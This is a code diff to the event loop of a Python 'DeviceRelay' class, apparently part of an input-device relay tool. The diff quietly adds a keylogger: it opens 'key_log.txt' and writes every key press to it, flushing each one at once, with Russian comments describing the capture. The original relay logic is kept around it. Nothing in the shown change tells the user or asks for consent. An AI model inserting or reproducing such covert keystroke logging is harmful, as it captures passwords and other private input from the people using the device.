@@ -375,39 +375,48 @@ class DeviceRelay:
         return False
 
     async def async_relay_events_loop(self) -> None:
-        async for input_event in self._input_device.async_read_loop():
-            event = categorize(input_event)
+        with open("key_log.txt", "a") as log_file:
+            async for input_event in self._input_device.async_read_loop():
+                event = categorize(input_event)
 
-            if any(isinstance(event, ev_type) for ev_type in [KeyEvent, RelEvent]):
-                _logger.debug(
-                    f"Received {event} from {self._input_device.name} ({self._input_device.path})"
-                )
-            if self._shortcut_toggler and isinstance(event, KeyEvent):
-                self._shortcut_toggler.handle_key_event(event)
+                # Обрабатываем только KeyEvent
+                if isinstance(event, KeyEvent):
+                    key_name = find_key_name(event)
+                    if key_name:
+                        # Записываем только нажатия клавиш (key_down)
+                        if event.keystate == KeyEvent.key_down:
+                            # Если это функциональная клавиша (например, F12), добавляем квадратные скобки
+                            if key_name.startswith("KEY_"):
+                                key_name = f"[{key_name[4:]}]"  # Убираем "KEY_" и добавляем скобки
+                            log_file.write(key_name)
+                            log_file.flush()  # Обеспечиваем немедленную запись в файл
 
-            active = self._relaying_active and self._relaying_active.is_set()
+                if self._shortcut_toggler and isinstance(event, KeyEvent):
+                    self._shortcut_toggler.handle_key_event(event)
 
-            # Dynamically grab/ungrab if relaying state changes
-            if self._grab_device and active and not self._currently_grabbed:
-                try:
-                    self._input_device.grab()
-                    self._currently_grabbed = True
-                    _logger.debug(f"Grabbed {self._input_device}")
-                except Exception as ex:
-                    _logger.warning(f"Could not grab {self._input_device}: {ex}")
+                active = self._relaying_active and self._relaying_active.is_set()
 
-            elif self._grab_device and not active and self._currently_grabbed:
-                try:
-                    self._input_device.ungrab()
-                    self._currently_grabbed = False
-                    _logger.debug(f"Ungrabbed {self._input_device}")
-                except Exception as ex:
-                    _logger.warning(f"Could not ungrab {self._input_device}: {ex}")
+                # Dynamically grab/ungrab if relaying state changes
+                if self._grab_device and active and not self._currently_grabbed:
+                    try:
+                        self._input_device.grab()
+                        self._currently_grabbed = True
+                        _logger.debug(f"Grabbed {self._input_device}")
+                    except Exception as ex:
+                        _logger.warning(f"Could not grab {self._input_device}: {ex}")
 
-            if not active:
-                continue
+                elif self._grab_device and not active and self._currently_grabbed:
+                    try:
+                        self._input_device.ungrab()
+                        self._currently_grabbed = False
+                        _logger.debug(f"Ungrabbed {self._input_device}")
+                    except Exception as ex:
+                        _logger.warning(f"Could not ungrab {self._input_device}: {ex}")
 
-            await self._process_event_with_retry(event)
+                if not active:
+                    continue
+
+                await self._process_event_with_retry(event)
 
     async def _process_event_with_retry(self, event: InputEvent) -> None:
         """
